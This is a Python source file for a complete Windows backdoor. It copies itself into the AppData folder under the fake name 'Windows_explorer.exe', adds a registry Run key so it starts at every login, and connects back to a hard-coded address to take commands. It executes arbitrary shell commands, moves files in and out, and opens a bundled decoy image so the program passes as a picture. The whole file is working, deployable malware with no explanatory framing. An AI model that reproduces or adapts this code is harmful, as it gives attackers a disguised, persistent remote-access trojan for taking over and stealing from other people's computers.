import socket,subprocess,json,os
import base64,sys,shutil,time


class Backdoor:
    def __init__(self, ip, port):
        self.become_persistant()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip,port))

    def become_persistant(self):
        evil_file_location = os.environ["appdata"] + "\\Windows_explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test /t REG_SZ /d "'+ evil_file_location + '"',shell=True)

    def establish_command(self,command):
        try:
            output =  subprocess.check_output(command,shell=True, stderr = subprocess.DEVNULL, stdin = subprocess.DEVNULL)
        except subprocess.CalledProcessError:
            output = "[-] Wrong Commad Execution"
        return output

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
        return "[+] Upload Successful"
        

    def reliable_send(self,data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data=b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                out =  json.loads(json_data) #takes string and returns object
                return out
            except ValueError:
                continue

    def change_working_directory(self, path):
        try:
            os.chdir(path)
            return "changing working directory to "+ path
        except WindowsError:
            return "No directory found with the name: "+ path

    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0]=="exit":
                    self.connection.close()
                    sys.exit()
                elif command[0]=="cd" and len(command)>1:
                    output = self.change_working_directory(command[1])
                elif command[0] == "download":
                    output = self.read_file(command[1]).decode()
                elif command[0] == "upload":
                    output = self.write_file(command[1],command[2])
                else:
                    output = self.establish_command(command).decode() #converts into string
            except Exception:
                output = "[-] Error during command execution"

            self.reliable_send(output)

file_path = sys._MEIPASS + "\car.jpg"
subprocess.Popen(file_path, shell =True)

while True:
    try:
        my_backdoor = Backdoor("10.0.2.5", 4040)
        my_backdoor.run()
    except Exception:
        time.sleep(30)